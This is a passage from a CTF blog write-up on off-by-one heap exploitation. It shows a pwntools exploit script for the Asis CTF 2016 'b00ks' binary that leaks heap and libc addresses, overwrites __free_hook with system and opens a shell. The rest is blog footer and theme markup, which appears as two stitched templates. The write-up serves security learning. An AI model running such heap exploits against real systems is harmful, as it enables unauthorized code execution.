class="params">(size,name,des_size,des)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"\nEnter book name size: "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter book name (Max 32 chars): "</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">"\nEnter book description size: "</span>, str(des_size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter book description: "</span>, des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_book</span><span class="params">(id)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the book id you want to delete: "</span>, str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span><span class="params">(id,new_des)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the book id you want to edit: "</span>, str(id))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter new book description: "</span>, new_des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memleak2</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">	msg=p.recvline().strip(<span class="string">"\n"</span>)</span><br><span class="line">    msg=u64(msg.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    log.success(<span class="string">"Leaked address of second book name pointer : "</span> + hex(msg))</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter author name: "</span>, name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memleak1</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Author:"</span>)</span><br><span class="line">	msg = p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)[<span class="number">33</span>:]</span><br><span class="line">	log.success(<span class="string">"msg : "</span>+msg)</span><br><span class="line">	addr = u64(msg.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">	log.success(<span class="string">"Leaked address of first book : "</span> + hex(addr))</span><br><span class="line">	<span class="keyword">return</span> addr</span><br><span class="line">create_name(<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line">create_book(<span class="number">140</span>,<span class="string">"a"</span>,<span class="number">140</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="comment">#leak book addr</span></span><br><span class="line">first_addr = memleak1()</span><br><span class="line">second_addr = first_addr + <span class="number">0x38</span></span><br><span class="line">log.success(<span class="string">"second addr : "</span> + hex(second_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#create second book</span></span><br><span class="line">create_book(<span class="number">0x21000</span>,<span class="string">"a"</span>,<span class="number">0x21000</span>,<span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake first book</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>) + p64(second_addr)*<span class="number">2</span> + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#null byte off-by-one</span></span><br><span class="line">change_name(<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak second book pointer</span></span><br><span class="line">sec_name_addr = memleak2()</span><br><span class="line"></span><br><span class="line">libcbase = sec_name_addr - <span class="number">0x5b0010</span></span><br><span class="line">log.info(<span class="string">"libcbase: %s"</span> % hex(libcbase))</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libcbase</span><br><span class="line">log.success(<span class="string">"free_hook : "</span> + hex(free_hook))</span><br><span class="line">execve_addr = libcbase + <span class="number">0x45216</span></span><br><span class="line">log.success(<span class="string">"execve : "</span> + hex(execve_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libcbase</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next() + libcbase</span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(<span class="number">1</span>, payload)</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit_book(<span class="number">2</span>, payload)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">edit_book(1,p64(free_hook)*2)</span></span><br><span class="line"><span class="string">edit_book(2,p64(execve_addr))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://pumpkin9.github.io">pumpkin9</a></p><p> <span>Link:  </span><a href="http://pumpkin9.github.io/2019/10/10/Off-By-One学习/">http://pumpkin9.github.io/2019/10/10/Off-By-One学习/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/10/17/Geek-10th-write-up/" title="Geek 10th write up"><span>< PreviousPost</span><br><span class="prevTitle">Geek 10th write up</span></a><a class="nextSlogan" href="/2019/09/02/TokyoWesternsCTF-2019-writeup/" title="TokyoWesternsCTF 2019 writeup"><span>NextPost ></span><br><span class="nextTitle">TokyoWesternsCTF 2019 writeup</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#off-by-one-利用思路"><span class="toc-number">2.</span> <span class="toc-text">off-by-one 利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#示例1"><span class="toc-number">2.1.</span> <span class="toc-text">示例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例2"><span class="toc-number">2.2.</span> <span class="toc-text">实例2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例1–-Asis-CTF-2016-b00ks"><span class="toc-number">2.3.</span> <span class="toc-text">实例1– Asis CTF 2016 b00ks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用"><span class="toc-number">2.3.1.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#相关问题解答"><span class="toc-number">2.3.2.</span> <span class="toc-text">相关问题解答</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
+
+
+  
+    <div class="post-reward">
+    <div id="reward-button">打赏</div>
+      <div id="qr">
+        <div class="wrap">
+            
+            <div class="bg-wrap">
+              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
+              支付宝
+            </div>
+            
+            
+            <div class="bg-wrap">
+                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
+              微信
+            </div>
+            
+        </div>
+      </div>
+    </div>
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+          <a href="/2019/10/17/Geek-10th-write-up/">Geek 10th write up</a>
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2019/09/02/TokyoWesternsCTF-2019-writeup/">TokyoWesternsCTF 2019 writeup</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="http://pumpkin9.github.io">pumpkin9</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="http://pumpkin9.github.io/2019/10/10/Off-By-One学习/">http://pumpkin9.github.io/2019/10/10/Off-By-One学习/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="http://pumpkin9.github.io">pumpkin9</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+        <footer>
+          <div class="copyright">
+            ©2019
+            <a href="http://pumpkin9.github.io">pumpkin9</a> Powered by <a href="https://hexo.io">Hexo</a> |
+            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
